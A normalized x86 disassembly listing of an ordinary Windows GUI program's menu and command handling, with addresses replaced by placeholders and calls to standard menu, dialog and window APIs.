lea eax [ ebx + eax + 0x4 ]
mov eax [ ebx + eax + 0x4 ]
jmp r-xdata
mov ecx rw-data
call sub_4010f0
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
mov ecx [ esp + 0x10950 ]
push 0x1
push 0x0
push eax
push ecx
call sub_485220
add esp 0x10
jmp r-xdata
push eax
lea edx [ esp + 0x2b4 ]
push r--data
push edx
call [ wsprintfA@IAT ]
mov ecx [ rw-data ]
add esp 0xc
lea eax [ esp + 0x2b0 ]
push eax
push ecx
call [ SetWindowTextA@IAT ]
mov edx [ esp + 0x10950 ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push edx
call sub_466930
add esp 0x18
mov eax rw-data
cmp [ eax + 0x1 ] 0x65
jne r-xdata
cmp [ eax ] 0x74
jne r-xdata
mov edi 0x10
cmp [ esp + 0x48 ] esi
jbe r-xdata
call sub_451740
lea edx [ esp + 0x4c ]
push edx
push eax
call edi
lea eax [ esp + 0x5c ]
push eax
call esi
mov eax [ esp + 0x5c ]
cmp [ esp + 0x4c ] eax
jg r-xdata
cmp eax [ esp + 0x54 ]
jg r-xdata
mov eax [ esp + 0x10950 ]
push 0x0
push eax
call [ GetMenu@IAT ]
push eax
call [ GetSubMenu@IAT ]
mov ebx [ esp + 0x10958 ]
cmp eax ebx
jne r-xdata
mov ebp [ esp + 0x10958 ]
xor edi edi
mov esi 0x200
mov ecx [ esp + 0x10950 ]
push 0x2
push 0x1
push ecx
mov [ esp + 0x24 ] 0x30
mov [ esp + 0x28 ] 0x11
call [ GetMenu@IAT ]
mov esi [ GetSubMenu@IAT ]
push eax
call esi
push eax
call esi
mov edi [ esp + 0x10958 ]
cmp eax edi
mov esi 0x200
jne r-xdata
mov edx [ esp + 0x10950 ]
push 0x3
push 0x1
push edx
call [ GetMenu@IAT ]
mov esi [ GetSubMenu@IAT ]
push eax
call esi
push eax
call esi
mov ebp [ esp + 0x10958 ]
xor edi edi
cmp eax ebp
mov esi 0x200
jne r-xdata
mov edx [ esp + 0x10950 ]
push 0x4
push edx
call [ GetMenu@IAT ]
push eax
call [ GetSubMenu@IAT ]
mov esi [ esp + 0x10958 ]
cmp eax esi
jne r-xdata
mov ecx [ esp + 0x10950 ]
push 0x5
push ecx
call [ GetMenu@IAT ]
push eax
call [ GetSubMenu@IAT ]
mov ebp [ esp + 0x10958 ]
cmp eax ebp
jne r-xdata
mov eax [ esp + 0x10950 ]
push 0x6
push eax
call [ GetMenu@IAT ]
push eax
call [ GetSubMenu@IAT ]
mov ebp [ esp + 0x10958 ]
cmp eax ebp
jne r-xdata
mov edx [ esp + 0x10958 ]
push edx
call sub_4aac40
add esp 0x4
jmp r-xdata
mov ebx [ esp + 0x10958 ]
push ebx
call [ GetMenuItemCount@IAT ]
mov esi eax
cmp esi 0x15
jge r-xdata
mov [ esp + 0x10 ] 0x0
mov esi 0x200
jmp r-xdata
mov edi [ esp + 0x10958 ]
xor ebp ebp
mov esi 0x200
jmp r-xdata
cmp bx 0x56ce
jb r-xdata
cmp bx 0x13c
ja r-xdata
mov edx [ esp + 0x10950 ]
push edx
call sub_44e900
add esp 0x4
jmp r-xdata
mov ecx [ rw-data ]
push ecx
call sub_45b620
add esp 0x4
jmp r-xdata
mov edx [ rw-data ]
push edx
call sub_477040
add esp 0x4
jmp r-xdata
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x21
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0x22
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x71
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x85
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
push eax
lea ecx [ ebp - 0x9cb8 ]
mov eax ecx
cdq
and edx 0x3
add eax edx
sar eax 0x2
add eax 0x26
and ecx 0x80000003
push 0x1
lea edx [ eax + eax * 2 ]
jns r-xdata
mov ecx [ rw-data ]
xor eax eax
test ecx ecx
sete al
mov [ rw-data ] eax
jmp r-xdata
mov edx [ rw-data ]
lea ecx [ esp + 0x5c ]
push ecx
push edx
call [ GetClientRect@IAT ]
mov al [ rw-data ]
test al al
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov ecx [ esp + 0x10950 ]
push ecx
call sub_4813e0
add esp 0x4
jmp r-xdata
mov edx [ rw-data ]
mov eax [ esp + 0x10950 ]
push 0x0
push sub_4875e0
push edx
push 0x9e
jmp r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0xd
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov edx [ esp + 0x10950 ]
mov eax [ rw-data ]
push 0x1
push 0x0
push edx
neg eax
push 0xffffffff
push eax
call sub_4719b0
add esp 0x14
jmp r-xdata
mov ecx [ esp + 0x10950 ]
mov edx [ rw-data ]
push 0x1
push 0x0
push ecx
push 0x1
push edx
call sub_4719b0
add esp 0x14
jmp r-xdata
mov eax [ esp + 0x10950 ]
push eax
call sub_487370
add esp 0x4
jmp r-xdata
mov ecx [ esp + 0x10950 ]
push ecx
call sub_45cca0
add esp 0x4
jmp r-xdata
fld [ rw-data ]
mov eax [ rw-data ]
fcomp [ r--data ]
test eax eax
fnstsw ax
jne r-xdata
mov [ esp + 0x60 ] ebx
mov [ esp + 0x64 ] ebx
mov [ esp + 0x68 ] ebx
mov [ esp + 0x10948 ] 0x2
mov [ esp + 0x94 ] 0xf
mov [ esp + 0x90 ] ebx
mov [ esp + 0x80 ] 0x0
lea ecx [ esp + 0x7c ]
push ecx
mov [ esp + 0x1094c ] 0x3
call sub_4b3b90
mov ecx 0x1e
mov esi r--data
lea edi [ esp + 0x134 ]
[ edi ] [ esi ]
add esp 0x4
movsw [ edi ] [ esi ]
push ebx
push 0x7a
lea ecx [ esp + 0x64 ]
movsb [ edi ] [ esi ]
call sub_46b020
mov eax [ esp + 0x60 ]
mov ecx 0x1e
lea esi [ esp + 0x130 ]
mov edi eax
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
cmp [ esp + 0x90 ] ebx
jbe r-xdata
cmp [ esp + 0x140 ] 0x2
jne r-xdata
jmp [ eax * 4 + jump_table_4a3554 ]
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x9a
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x93
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0x97
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x95
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x96
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0x98
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0xaa
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0xa3
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0xa4
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov ecx [ esp + 0x10950 ]
push ecx
call sub_445a10
add esp 0x4
jmp r-xdata
mov eax [ esp + 0x10950 ]
push 0x0
push sub_461ef0
push eax
push 0xda
jmp r-xdata
mov edx [ esp + 0x10950 ]
push edx
call sub_46e5f0
add esp 0x4
jmp r-xdata
mov eax [ esp + 0x10950 ]
push 0x0
push sub_46e7f0
push eax
push 0xc28
jmp r-xdata
mov eax [ esp + 0x10950 ]
push 0x0
push sub_4589d0
push eax
push 0xd9
jmp r-xdata
mov eax [ esp + 0x10950 ]
push 0x0
push r-xdata
push eax
push 0x136
jmp r-xdata
mov ecx [ rw-data ]
xor eax eax
test ecx ecx
sete al
mov [ rw-data ] eax
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x8e
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0x8f
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x8d
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
add ebp 0xfffffeea
cmp eax ebp
je r-xdata
mov eax [ esp + 0x10950 ]
push 0x0
push sub_489450
push eax
push 0xe2
mov eax [ rw-data ]
push eax
push 0x1
push 0x4d
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x82
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x83
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0x84
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x4e
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x4f
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0x50
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
xor ecx ecx
cmp bx 0xfb
setne cl
test eax eax
mov [ rw-data ] ecx
jne r-xdata
mov eax [ rw-data ]
xor ecx ecx
test eax eax
sete cl
mov [ rw-data ] ecx
jmp r-xdata
cmp bx 0x131
jne r-xdata
mov eax [ esp + 0x10950 ]
push 0x0
push r-xdata
push eax
push 0xe1
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x6d
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0x6f
call sub_48a5f0
add esp 0xc
jmp r-xdata
push 0x2
call sub_4231b0
add esp 0x4
mov ecx rw-data
call sub_403ab0
jmp r-xdata
push 0x1
call sub_4231b0
add esp 0x4
jmp r-xdata
lea esi [ ebp - 0xd6 ]
xor eax eax
mov ecx 0x13
lea edi [ esp + 0xb8 ]
push esi
[ edi ]
call sub_421f40
add esp 0x4
push eax
lea ecx [ esp + 0x134 ]
push ecx
call [ lstrcpyA@IAT ]
mov eax [ esp + 0x10950 ]
push 0xfffffffa
push eax
mov [ esp + 0xc0 ] 0x4c
mov [ esp + 0xc4 ] eax
call [ GetWindowLongA@IAT ]
mov [ esp + 0xc0 ] eax
mov eax 0x103
mov [ esp + 0xd8 ] eax
mov [ esp + 0xe0 ] eax
cmp [ rw-data ] 0x10
lea edx [ esp + 0x130 ]
lea ecx [ esp + 0x6cc ]
mov [ esp + 0xf4 ] r--data
mov [ esp + 0xc4 ] r--data
mov [ esp + 0xd0 ] 0x1
mov [ esp + 0xd4 ] edx
mov [ esp + 0xdc ] ecx
jb r-xdata
mov eax [ esp + 0x10950 ]
push eax
push 0xffffffff
push 0x67
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov ecx [ esp + 0x10950 ]
push ecx
push 0xffffffff
push 0x68
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x89
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0x4b
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x4c
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x8b
call sub_48a5f0
add esp 0xc
jmp r-xdata
movzx ecx [ eax + lookup_table_4a3344 ]
jmp [ ecx * 4 + jump_table_4a32c8 ]
mov [ rw-data ] ecx
push eax
call sub_441600
add esp 0x4
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
push eax
call esi
dec esi
jns r-xdata
push eax
call ebx
test ebx ebx
mov eax ebx
jge r-xdata
xor ebx ebx
test ebx ebx
jge r-xdata
mov ecx [ rw-data ]
mov [ ecx + eax * 4 ] 0x0
mov ecx [ rw-data ]
inc eax
cmp eax ecx
jl r-xdata
inc [ esp + 0x10 ]
add edi 0x70
jmp r-xdata
mov eax [ rw-data ]
lea edx [ edi + eax ]
push edx
lea ecx [ ebx + eax ]
call sub_402540
mov eax [ rw-data ]
mov [ ebx + eax + 0x48 ] ebp
mov ecx [ rw-data ]
mov [ ebx + ecx + 0x38 ] ebp
inc ebp
add ebx 0x70
push edx
push eax
push esi
call sub_4b69f0
add esp 0xc
test eax eax
jne r-xdata
mov edx [ edi + 0x24 ]
push edx
push eax
push ecx
call sub_423720
add esp 0xc
mov eax [ rw-data ]
mov esi 0x10
cmp eax esi
mov eax [ rw-data ]
jae r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov ebp [ wsprintfA@IAT ]
xor edi edi
cmp ecx edi
mov eax 0xf
je r-xdata
push eax
push rw-data
call sub_481f30
add esp 0x8
lea ecx [ ebp + 0x4 ]
mov ecx [ ebp + 0x4 ]
jmp r-xdata
mov ecx rw-data
inc ebp
add ebx 0x70
call sub_4010f0
cmp ebp eax
jl r-xdata
mov eax [ rw-data ]
lea edx [ ebx + eax ]
lea ecx [ esi + eax ]
push edx
call sub_402540
mov ecx [ rw-data ]
mov [ esi + ecx + 0x48 ] edi
mov edx [ rw-data ]
mov [ esi + edx + 0x38 ] edi
inc edi
add esi 0x70
push eax
call sub_439280
add esp 0x4
cmp eax 0x7
je r-xdata
mov eax [ rw-data ]
imul esi esi 0x70
add ebx 0x8
add esi eax
push ebx
push esi
call sub_4013c0
add esp 0x8
test al al
je r-xdata
cmp [ eax + 0x2 ] 0x78
jne r-xdata
mov ebp [ esp + 0x10950 ]
mov edi [ lstrcmpiA@IAT ]
mov ebx [ lstrlenA@IAT ]
cmp eax [ esp + 0x54 ]
jg r-xdata
mov eax [ esp + 0x60 ]
cmp [ esp + 0x50 ] eax
jg r-xdata
mov edx [ rw-data ]
mov esi [ EnableMenuItem@IAT ]
xor ecx ecx
test edx edx
sete cl
mov edi ecx
push edi
push 0x9c70
push ebx
call esi
push edi
push 0x81
push ebx
call esi
push edi
push 0x118
push ebx
call esi
mov eax [ rw-data ]
test eax eax
jl r-xdata
cmp edi 0x3
jne r-xdata
cmp eax 0x9
jne r-xdata
xor ebp ebp
jmp r-xdata
mov ebp [ GetMenuItemInfoA@IAT ]
lea eax [ esp + 0x18 ]
push eax
push 0x0
push 0x116
lea edx [ esp + 0x2bc ]
push edi
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x50 ] esi
mov [ esp + 0x4c ] edx
call ebp
mov ebx [ rw-data ]
xor ecx ecx
test ebx ebx
mov ebx [ SetMenuItemInfoA@IAT ]
setne cl
lea edx [ esp + 0x18 ]
push edx
push 0x0
push 0x116
push edi
mov [ esp + 0x30 ] esi
dec ecx
and ecx 0x8
mov [ esp + 0x34 ] ecx
call ebx
lea ecx [ esp + 0x18 ]
push ecx
push 0x0
push 0x117
lea eax [ esp + 0x2bc ]
push edi
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x50 ] esi
mov [ esp + 0x4c ] eax
call ebp
mov ecx [ rw-data ]
xor edx edx
cmp ecx 0x1
setne dl
lea eax [ esp + 0x18 ]
push eax
push 0x0
push 0x117
push edi
mov [ esp + 0x30 ] esi
dec edx
and edx 0x8
mov [ esp + 0x34 ] edx
call ebx
jmp r-xdata
lea edx [ esp + 0x18 ]
push edx
push 0x0
lea ebx [ edi + 0x131 ]
push ebx
lea ecx [ esp + 0x2bc ]
push ebp
mov [ esp + 0x28 ] 0x30
mov [ esp + 0x2c ] 0x11
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x50 ] esi
mov [ esp + 0x4c ] ecx
call [ GetMenuItemInfoA@IAT ]
mov ecx [ rw-data ]
xor eax eax
cmp edi ecx
setne al
lea ecx [ esp + 0x18 ]
push ecx
push 0x0
push ebx
push ebp
mov [ esp + 0x30 ] esi
dec eax
and eax 0x8
mov [ esp + 0x34 ] eax
call [ SetMenuItemInfoA@IAT ]
inc edi
cmp edi 0x3
jl r-xdata
mov [ esp + 0x18 ] 0x30
mov [ esp + 0x1c ] 0x11
lea esp [ esp ]
test [ rw-data ] 0x8
mov ebx [ CheckMenuItem@IAT ]
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
mov eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov esi [ CheckMenuItem@IAT ]
mov edi 0x1
cmp eax edi
jne r-xdata
mov ebx [ GetMenuItemInfoA@IAT ]
xor edi edi
mov esi 0x200
mov eax [ rw-data ]
test eax eax
je r-xdata
xor ebp ebp
mov edi rw-data
mov esi 0x200
mov edi [ AppendMenuA@IAT ]
jmp r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x2b0 ]
cdq
mov [ esp + 0x3c ] ecx
mov ecx 0x3
idiv ecx
mov [ esp + 0x18 ] 0x30
mov [ esp + 0x1c ] 0x11
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x40 ] esi
mov edi edx
lea edx [ esp + 0x18 ]
push edx
mov ebp eax
mov eax [ esp + 0x1095c ]
push 0x0
lea ebx [ edi + ebp * 4 + 0x9cb8 ]
push ebx
push eax
call [ GetMenuItemInfoA@IAT ]
mov eax [ rw-data ]
xor edx edx
lea ecx [ edi + ebp * 4 + 0xc ]
cmp eax ecx
mov ecx [ esp + 0x10958 ]
setne dl
lea eax [ esp + 0x18 ]
push eax
push 0x0
push ebx
push ecx
mov [ esp + 0x30 ] esi
dec edx
and edx 0x8
mov [ esp + 0x34 ] edx
call [ SetMenuItemInfoA@IAT ]
mov eax [ esp + 0x10 ]
inc eax
cmp eax 0x9
mov [ esp + 0x10 ] eax
jl r-xdata
lea eax [ esp + 0x18 ]
push eax
push 0x0
lea ebx [ ebp + 0x168 ]
push ebx
lea edx [ esp + 0x2bc ]
push edi
mov [ esp + 0x28 ] 0x30
mov [ esp + 0x2c ] 0x11
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x50 ] esi
mov [ esp + 0x4c ] edx
call [ GetMenuItemInfoA@IAT ]
mov edx [ rw-data ]
xor ecx ecx
cmp ebp edx
setne cl
lea edx [ esp + 0x18 ]
push edx
push 0x0
push ebx
push edi
mov [ esp + 0x30 ] esi
dec ecx
and ecx 0x8
mov [ esp + 0x34 ] ecx
call [ SetMenuItemInfoA@IAT ]
inc ebp
cmp ebp 0x3
jl r-xdata
cmp bx 0x8235
jb r-xdata
mov edx [ rw-data ]
add edx 0x56cd
cmp ebp edx
jg r-xdata
mov ecx [ rw-data ]
push 0x1
push 0x0
push 0x1
lea eax [ ebp - 0x138 ]
push edi
push ecx
mov [ rw-data ] eax
call sub_47e330
add esp 0x14
jmp r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
add edx ecx
push edx
call sub_48a5f0
add esp 0xc
jmp r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov ecx [ rw-data ]
push 0x0
mov [ rw-data ] 0x0
push ecx
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
mov ecx rw-data
mov [ rw-data ] 0x1
call sub_4010f0
test eax eax
jbe r-xdata
mov dl [ rw-data ]
test dl dl
sete cl
mov [ rw-data ] cl
call sub_40af10
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_419a80
add esp 0x8
cmp eax 0x1
jne r-xdata
mov eax [ esp + 0x10950 ]
push eax
call sub_41b660
add esp 0x4
jmp r-xdata
push rw-data
push rw-data
call sub_419a80
add esp 0x8
cmp eax 0x1
jne r-xdata
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
jmp r-xdata
test ah 0x44
mov [ rw-data ] 0x0
jpe r-xdata
test ah 0x41
mov [ rw-data ] 0x1
jne r-xdata
mov ebp 0x10
lea edx [ esp + 0x17 ]
push edx
lea ecx [ esp + 0x60 ]
mov [ esp + 0x1b ] 0x3b
call sub_46bc80
mov eax [ esp + 0x60 ]
cmp eax ebx
jne r-xdata
mov [ esp + 0xb8 ] 0x58
mov edx [ rw-data ]
push edx
push 0x1
push 0xa8
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0xa9
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0xa7
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov edx [ esp + 0x10950 ]
push edx
call sub_430040
add esp 0x4
jmp r-xdata
mov al [ rw-data ]
test al al
mov [ rw-data ] 0x0
je r-xdata
mov al [ rw-data ]
test al al
mov [ rw-data ] 0x1
je r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
mov al [ rw-data ]
test al al
mov [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x1
mov al [ rw-data ]
test al al
mov [ rw-data ] 0x2
je r-xdata
mov al [ rw-data ]
test al al
mov [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov al [ rw-data ]
test al al
mov [ rw-data ] 0x2
je r-xdata
mov eax [ rw-data ]
xor ecx ecx
test eax eax
sete cl
mov [ rw-data ] ecx
jmp r-xdata
mov edx [ esp + 0x10950 ]
push edx
call sub_4a8da0
add esp 0x4
cmp eax 0x1
jne r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x52
call sub_48a5f0
add esp 0xc
jmp r-xdata
push eax
call [ SetFocus@IAT ]
jmp r-xdata
mov edx [ rw-data ]
push eax
mov eax [ esp + 0x10954 ]
push sub_498030
push edx
push 0xe3
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ CreateDialogParamA@IAT ]
mov [ rw-data ] eax
jmp r-xdata
cmp bx 0x132
jne r-xdata
push 0x6c
push 0x6b
mov [ rw-data ] 0x0
call sub_458630
push 0x6c
push 0x92
call sub_458630
add esp 0x10
jmp r-xdata
mov [ esp + 0xe4 ] rw-data
mov edx [ rw-data ]
mov [ esp + 0xe4 ] edx
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x13
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0x14
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
xor ecx ecx
test eax eax
sete cl
mov [ rw-data ] ecx
jmp r-xdata
mov dl [ rw-data ]
mov ecx [ rw-data ]
test dl dl
sete al
test ecx ecx
mov [ rw-data ] al
je r-xdata
mov cl [ rw-data ]
mov eax 0x8
test al cl
mov ecx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
xor esi esi
cmp eax esi
jne r-xdata
mov al [ rw-data ]
movzx edx [ rw-data ]
test al al
sete al
xor ecx ecx
test al al
sete cl
mov [ rw-data ] al
cmp edx ecx
je r-xdata
mov edx [ esp + 0x10950 ]
push edx
call sub_4377f0
add esp 0x4
jmp r-xdata
mov eax [ esp + 0x10950 ]
push 0x0
push sub_457810
push eax
push 0x9f
jmp r-xdata
mov bl [ rw-data ]
mov ecx rw-data
call sub_404310
mov ecx rw-data
mov [ rw-data ] 0x1
call sub_401420
mov eax [ esp + 0x10950 ]
push eax
call sub_497eb0
mov ecx [ rw-data ]
add esp 0x4
push ecx
call [ SetFocus@IAT ]
mov [ rw-data ] bl
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x88
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0x8a
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov ecx [ esp + 0x10950 ]
mov edx [ rw-data ]
push 0x1
push 0x0
push ecx
push 0x1
push edx
call sub_4719b0
add esp 0x14
jmp r-xdata
mov eax [ esp + 0x10950 ]
push 0x1
push 0x0
push eax
push 0x1
push 0x1
call sub_4719b0
add esp 0x14
jmp r-xdata
mov ecx [ esp + 0x10950 ]
push 0x1
push 0x0
push ecx
push 0x1
push 0xa
call sub_4719b0
add esp 0x14
jmp r-xdata
mov edx [ esp + 0x10950 ]
push 0x1
push 0x0
push edx
push 0x1
push 0x14
call sub_4719b0
add esp 0x14
jmp r-xdata
mov eax [ esp + 0x10950 ]
push 0x1
push 0x0
push eax
push 0x1
push 0x32
call sub_4719b0
add esp 0x14
jmp r-xdata
mov ecx [ esp + 0x10950 ]
mov eax [ rw-data ]
mov esi [ rw-data ]
push 0x1
push 0x0
push ecx
mov ecx [ rw-data ]
sub eax ecx
sub eax esi
inc eax
cdq
idiv ecx
push 0xffffffff
imul eax ecx
push eax
call sub_4719b0
add esp 0x14
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x49
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ esp + 0x10950 ]
mov ecx [ rw-data ]
push 0x1
push 0x0
push eax
neg ecx
push 0xffffffff
push ecx
call sub_4719b0
add esp 0x14
jmp r-xdata
mov edx [ esp + 0x10950 ]
push 0x1
push 0x0
push edx
push 0xffffffff
push 0xffffffff
call sub_4719b0
add esp 0x14
jmp r-xdata
mov eax [ esp + 0x10950 ]
push 0x1
push 0x0
push eax
push 0xffffffff
push 0xfffffff6
call sub_4719b0
add esp 0x14
jmp r-xdata
mov ecx [ esp + 0x10950 ]
push 0x1
push 0x0
push ecx
push 0xffffffff
push 0xffffffec
call sub_4719b0
add esp 0x14
jmp r-xdata
mov edx [ esp + 0x10950 ]
push 0x1
push 0x0
push edx
push 0xffffffff
push 0xffffffce
call sub_4719b0
add esp 0x14
jmp r-xdata
mov eax [ esp + 0x10950 ]
push 0x1
push 0x0
push eax
mov eax [ rw-data ]
mov ecx eax
and ecx 0x1
add ecx eax
neg ecx
push 0x1
push ecx
call sub_4719b0
add esp 0x14
jmp r-xdata
mov edx [ rw-data ]
push 0x0
push 0x0
push edi
push edx
call [ PostMessageA@IAT ]
jmp r-xdata
push ebx
push ebx
push 0x1410
push esi
mov [ rw-data ] ebx
call [ PostMessageA@IAT ]
jmp r-xdata
mov [ rw-data ] ebx
jmp r-xdata
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
push eax
call esi
mov eax [ edi + esi * 4 ]
cmp [ rw-data ] eax
je r-xdata
mov ebx [ DeleteObject@IAT ]
cmp [ rw-data ] 0x2
je r-xdata
xor eax eax
mov edi [ esp + 0x48 ]
cmp edi [ rw-data ]
jge r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
push eax
call sub_454440
add esp 0x4
test eax eax
je r-xdata
mov eax rw-data
lea ecx [ esp + 0x2b0 ]
push r--data
push ecx
mov [ rw-data ] 0x12e
call ebx
mov eax [ rw-data ]
add esp 0x8
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
mov ebx [ esp + 0x1095c ]
jle r-xdata
mov [ esp + 0x128 ] eax
mov [ esp + 0x124 ] edi
mov [ esp + 0x114 ] 0x0
mov [ esp + 0xb0 ] eax
mov [ esp + 0xac ] edi
mov [ esp + 0x9c ] 0x0
cmp [ rw-data ] edi
mov [ esp + 0x10948 ] 0x6
mov ebx 0x10
je r-xdata
lea eax [ edi + eax + 0x4 ]
mov eax [ edi + eax + 0x4 ]
jmp r-xdata
mov eax [ rw-data ]
cmp [ edi + eax + 0x18 ] 0x10
jb r-xdata
mov edx [ rw-data ]
mov eax [ esp + 0x10950 ]
push 0x1
push 0x0
push edx
push eax
call sub_485220
add esp 0x10
jmp r-xdata
cmp [ eax + 0x3 ] 0x74
jne r-xdata
mov eax [ esp + 0x48 ]
inc esi
cmp esi eax
jb r-xdata
push r--data
lea eax [ esp + 0x4c8 ]
push eax
call ebx
lea ecx [ esp + 0x4c8 ]
sub ecx 0x4
add eax ecx
push eax
call edi
test eax eax
jne r-xdata
mov eax [ esp + 0x60 ]
cmp [ esp + 0x50 ] eax
jg r-xdata
cmp eax [ esp + 0x58 ]
jg r-xdata
push 0x1
push 0x0
jmp r-xdata
cmp edi 0x4
jne r-xdata
cmp eax 0xa
jne r-xdata
mov edx [ rw-data ]
dec edx
cmp edi edx
jne r-xdata
mov [ esp + 0x24 ] 0x8
jmp r-xdata
lea edx [ esp + 0x18 ]
push edx
push 0x0
lea ebx [ ebp + 0x9ca4 ]
push ebx
lea ecx [ esp + 0x2bc ]
push edi
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x50 ] esi
mov [ esp + 0x4c ] ecx
call [ GetMenuItemInfoA@IAT ]
mov ecx [ rw-data ]
xor eax eax
cmp ebp ecx
setne al
lea ecx [ esp + 0x18 ]
push ecx
push 0x0
push ebx
push edi
mov [ esp + 0x30 ] esi
dec eax
and eax 0x8
mov [ esp + 0x34 ] eax
call [ SetMenuItemInfoA@IAT ]
inc ebp
cmp ebp 0x7
jl r-xdata
jmp r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push 0x0
lea ebx [ edi + 0x138 ]
push ebx
lea eax [ esp + 0x2bc ]
push ebp
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x50 ] esi
mov [ esp + 0x4c ] eax
call [ GetMenuItemInfoA@IAT ]
mov eax [ rw-data ]
xor edx edx
cmp eax edi
setne dl
lea eax [ esp + 0x18 ]
push eax
push 0x0
push ebx
push ebp
mov [ esp + 0x30 ] esi
dec edx
and edx 0x8
mov [ esp + 0x34 ] edx
call [ SetMenuItemInfoA@IAT ]
inc edi
cmp edi 0x5
